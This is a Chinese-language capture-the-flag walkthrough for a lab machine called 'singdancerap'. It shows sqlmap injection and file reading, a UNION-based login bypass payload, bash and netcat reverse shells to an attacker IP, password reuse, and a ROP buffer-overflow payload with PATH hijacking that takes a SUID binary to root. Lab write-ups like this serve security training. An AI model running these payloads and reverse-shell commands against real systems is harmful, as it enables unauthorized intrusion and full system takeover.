# **一、信息收集**

## **1. 主机与服务发现**

首先，在本地网络中使用 `arp-scan` 扫描存活主机，确定目标靶机IP地址为 `192.168.205.245`。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.245 08:00:27:82:68:fa       PCS Systemtechnik GmbH
...
```

接着，使用 `nmap` 对目标主机进行全端口扫描，发现其开放了 22 (SSH) 和 80 (HTTP) 端口。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.245
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-04 10:09 EDT
Nmap scan report for 192.168.205.245
Host is up (0.0013s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
```

## **2. Web服务探索与SQL注入**

访问80端口，发现是一个新闻网站。网站内的链接 `http://192.168.205.245/news.php?title=...` 存在明显的GET参数，这通常是漏洞的切入点。

使用 `sqlmap` 对 `title` 参数进行测试，迅速确认存在SQL注入漏洞。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sqlmap -u "http://192.168.205.245/news.php?title=1" --batch
...
---
Parameter: title (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: title=1' AND (SELECT 4710 FROM (SELECT(SLEEP(5)))shBD) AND 'ceXN'='ceXN

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: title=1' UNION ALL SELECT NULL,CONCAT(0x71627a6271,...),NULL-- -
---
[10:14:22] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.59
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
...
```

`sqlmap` 确认后台数据库为MySQL，并且该注入点为DBA权限。

# **二、初始访问**

## **1. 漏洞利用：从SQL注入到后台源码泄露**

利用SQL注入点，我们首先尝试获取数据库中的用户信息。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sqlmap -u "http://192.168.205.245/news.php?title=1" --batch -D news_db -T users --dump
...
Database: news_db
Table: users
[2 entries]
+----+-----------+----------+
| id | password  | username |
+----+-----------+----------+
| 1  | password1 | user1    |
| 2  | password2 | user2    |
+----+-----------+----------+
...
```

获取到的用户名和密码 (`user1:password1`) 看起来是无效的测试数据。接着，使用 `gobuster` 对网站目录进行爆破，发现一个隐藏目录 `/littlesecrets/`，其中包含一个登录页面 `login.php`。

由于数据库中的凭据无效，我们的策略转向读取Web服务器上的文件，以获取后台登录的真实逻辑。通过读取Apache的配置文件 `/etc/apache2/apache2.conf`，我们发现网站的根目录被修改为 `/var/www/he110wor1d`。

```bash
# 从apache2.conf中发现的关键配置
<Directory /var/www/he110wor1d/>
        Options -Indexes
        AllowOverride None
        Require all granted
</Directory>

<VirtualHost *:80>
    DocumentRoot /var/www/he110wor1d
...
```

利用这个信息，我们成功读取了 `login.php` 的源代码，并发现了数据库的连接密码。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sqlmap -u "http://192.168.205.245/news.php?title=1" --batch --file-read="/var/www/he110wor1d/littlesecrets/login.php"
...
$servername = "localhost";
$username = "root";
$password = "i_love_sing_dance_rap";
$dbname = "news_db";
...
```

# **2. 身份伪造与命令执行**

接着读取登录成功后跳转的页面 `manager.php`，发现一个命令执行漏洞，但需要登录用户的用户名为 `he110wor1d_admin`。

```php
// 从 manager.php 源码中发现的关键代码
if ($_SESSION['username'] !== 'he110wor1d_admin') {
    die("Access Denied. You do not have permission to access this page.");
}
...
$command = $_POST['command'];
$command_output = shell_exec($command);
...
```

由于 `login.php` 的SQL查询存在缺陷，我们可以通过构造UNION查询来伪造身份。在登录框中输入以下payload：

*   **Username**: `' UNION SELECT 1, 'he110wor1d_admin', '1' #`
*   **Password**: `1`

成功登录后，我们进入了 `manager.php` 的命令执行面板。为了获得一个稳定的交互式Shell，我们执行反弹Shell命令。

首先，在攻击机上监听端口：

```bash
nc -lvnp 8888
```

然后在Web面板中执行：

```bash
bash -c 'bash -i >& /dev/tcp/192.168.205.128/8888 0>&1'
```

成功获取 `www-data` 用户的shell。

# **三、权限提升**

## **1. 水平提权：www-data -> he110wor1d**

在获取 `www-data` 权限后，我们怀疑之前从 `login.php` 中泄露的数据库密码 `i_love_sing_dance_rap` 可能被系统用户 `he110wor1d` 复用。

```bash
www-data@singdancerap:/var/www/he110wor1d/littlesecrets$ su he110wor1d 
Password: i_love_sing_dance_rap
he110wor1d@singdancerap:/home$ id
uid=1001(he110wor1d) gid=1001(he110wor1d) groups=1001(he110wor1d)
```

成功切换到 `he110wor1d` 用户，并在其家目录下找到第一个flag。

```bash
he110wor1d@singdancerap:~$ cat user.txt
#SQL injection can not only retrieve data but also forge it.

User flag:107883ee-f5e4-11ef-8542-005056207011
```

## **2. 垂直提权：he110wor1d -> root (SUID & ROP)**

在 `he110wor1d` 用户的家目录下，发现一个拥有SUID权限的可执行文件 `thekey2root`。

```bash
he110wor1d@singdancerap:~/thekey2root$ ls -al
-rwsr-sr-x 1 root root 15472 Mar 1 00:23 thekey2root
```

使用 `checksec` 检查该文件，发现它是一个32位程序，没有PIE和Canary保护，但开启了NX。这是典型的ROP攻击场景。

```bash
[*] '/mnt/hgfs/gx/x/tmp/thekey2root'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
```

通过GDB动态调试，我们发现 `main` 函数中的 `input()` (即 `scanf`) 存在栈溢出漏洞。利用 `pattern create` 和 `pattern offset`，我们精算出覆盖返回地址所需的偏移量为 **32字节**。

我们的目标是利用程序中的 `system()` 函数来执行命令。为了获得root权限，我们需要一个能够提权的函数。`sing_dance_rap` 函数（地址 `0x08049213`）恰好可以做到这一点，因为它内部调用了 `setuid(0)` 和 `setgid(0)`。

**构造ROP链**：
我们的计划是，先跳转到 `sing_dance_rap` 提权，然后从 `sing_dance_rap` 返回时，再跳转到 `system` 函数，并让其执行我们想要的命令。

*   **填充**：32字节的垃圾数据。
*   **第一跳**：`sing_dance_rap` 的地址 (`0x08049213`)。
*   **第二跳**：`system@plt` 的地址 (`0x08049040`)。
*   **`system`的返回地址**：一个任意的占位地址 (e.g., `0xdeadbeef`)。
*   **`system`的参数**：在程序的只读数据段，我们发现了一个完美的字符串 `"s"`，其地址为 `0x0804a03e`。

**环境准备与攻击执行**：
在靶机上，我们通过环境变量劫持，让 `system("s")` 执行我们指定的反弹Shell脚本。

```bash
# 1. 在攻击机上监听端口
nc -lvnp 9999

# 2. 在靶机上准备环境 (he110wor1d用户下)
echo "nc 192.168.205.128 9999 -e /bin/bash" > s
chmod +x s
export PATH=.:$PATH
```

**最终Payload**:

```
"A"*32 + p32(0x08049213) + p32(0x08049040) + p32(0xdeadbeef) + p32(0x0804a03e)
```

在靶机上，使用Perl执行此payload：

```bash
he110wor1d@singdancerap:~/thekey2root$ perl -e 'print "A"x32 . "\x13\x92\x04\x08" . "\x40\x90\x04\x08" . "\xef\xbe\xad\xde" . "\x3e\xa0\x04\x08"' | ./thekey2root
```

命令执行后，程序会看似卡住，此时我们的攻击机已收到 `root` 权限的反弹Shell。

# **四、夺取旗帜**

成功获取 `root` shell后，读取最终的flag。

```bash
root@singdancerap:~# id
uid=0(root) gid=0(root) groups=0(root),1001(he110wor1d)
root@singdancerap:~# cat /root/root.txt
#During the process of PWN, the execution of the system function does not necessarily have to be bash.

root flag:943ac8c9-f696-11ef-8bd4-005056207011
```

至此，靶机`singdancerap`的所有挑战均已完成。
